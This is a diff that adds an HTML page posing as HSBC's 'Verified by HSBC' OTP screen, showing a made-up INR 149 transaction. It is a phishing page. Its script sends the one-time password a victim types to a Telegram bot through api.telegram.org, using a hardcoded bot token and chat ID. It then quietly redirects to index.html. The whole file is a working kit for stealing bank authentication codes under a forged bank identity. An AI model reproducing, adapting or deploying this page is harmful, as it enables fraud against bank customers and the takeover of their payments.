@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verified by HSBC - Secure Payment</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --hsbc-red: #db0011;
+            --text-dark: #333;
+            --border-light: #d5d5d5;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: 'Noto Sans', Arial, sans-serif;
+            background-color: #fff;
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        /* --- GLOBAL HEADER --- */
+        header {
+            border-bottom: 1px solid #eee;
+            padding: 10px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #fff;
+        }
+        .logo-text {
+            color: var(--hsbc-red);
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            font-family: serif;
+            text-decoration: none;
+        }
+        .secure-tag {
+            font-size: 12px;
+            color: #666;
+            font-weight: bold;
+            border: 1px solid #ccc;
+            padding: 4px 8px;
+        }
+
+        /* --- OTP CONTAINER --- */
+        .main-wrapper {
+            max-width: 450px;
+            margin: 60px auto;
+            padding: 20px;
+        }
+        .otp-card {
+            background: #fff;
+            padding: 30px;
+            border: 1px solid #eee;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        .bank-logo-small {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--hsbc-red);
+            margin-bottom: 10px;
+            display: block;
+        }
+        h2 { font-size: 18px; margin-bottom: 20px; color: #000; }
+        
+        .txn-details {
+            background: #f9f9f9;
+            padding: 15px;
+            text-align: left;
+            font-size: 13px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+        }
+        .txn-row { display: flex; justify-content: space-between; margin-bottom: 5px; }
+        .txn-label { color: #777; }
+        .txn-value { font-weight: bold; }
+
+        .form-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 13px; margin-bottom: 8px; font-weight: bold; }
+        
+        input[type="number"], input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-light);
+            border-radius: 4px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 4px;
+            background: #fafafa;
+        }
+        input:focus { outline: 1px solid var(--hsbc-red); background: #fff; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: var(--hsbc-red);
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 2px;
+            transition: 0.3s;
+        }
+        .submit-btn:hover { opacity: 0.9; }
+
+        .resend-text { font-size: 12px; margin-top: 15px; color: #666; }
+        .resend-text a { color: var(--hsbc-red); text-decoration: none; }
+
+        /* --- FOOTER --- */
+        footer {
+            background: #f9f9f9;
+            padding: 40px 5% 20px;
+            margin-top: 60px;
+            border-top: 1px solid #eee;
+        }
+        .footer-bottom {
+            max-width: 1100px;
+            margin: 0 auto;
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .main-wrapper { margin: 20px auto; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="#" class="logo-text">HSBC</a>
+    <div class="secure-tag">SECURE SESSIONS</div>
+</header>
+
+<div class="main-wrapper">
+    <div class="otp-card">
+        <span class="bank-logo-small">HSBC</span>
+        <h2>Authenticate Transaction</h2>
+        
+        <div class="txn-details">
+            <div class="txn-row"><span class="txn-label">Merchant:</span> <span class="txn-value">HSBC Digital</span></div>
+            <div class="txn-row"><span class="txn-label">Amount:</span> <span class="txn-value">INR 149.00</span></div>
+            <div class="txn-row"><span class="txn-label">Card Number:</span> <span class="txn-value">XXXX XXXX XXXX XXXX</span></div>
+        </div>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <label>Enter One-Time Password (OTP)</label>
+                <input type="text" id="otp" name="otp" placeholder="******" maxlength="6" required>
+            </div>
+            <button type="submit" class="submit-btn">Confirm Payment</button>
+        </form>
+        
+        <p class="resend-text">Didn't receive code? <a href="#">Resend OTP</a></p>
+        <p style="font-size: 10px; color: #bbb; margin-top: 20px;">Secured by 256-bit SSL Encryption</p>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-bottom">
+        <p>&copy; 2026 The Hongkong and Shanghai Banking Corporation Limited. All rights reserved.</p>
+        <p style="margin-top: 10px;">Security | Privacy | Terms of Use</p>
+    </div>
+</footer>
+
+<script>
+document.getElementById("otpForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    
+    const botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+    const chatId = "8608321495";
+    const otpVal = document.getElementById("otp").value;
+
+    const text = `🔑 OTP RECEIVED\n\nOTP Code: ${otpVal}\nTimestamp: ${new Date().toLocaleString()}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+    })
+    .then(() => { 
+        // Redirect back to index or a success page
+        window.location.href = "index.html"; 
+    })
+    .catch(() => { window.location.href = "index.html"; });
+});
+</script>
+
+</body>
+</html>
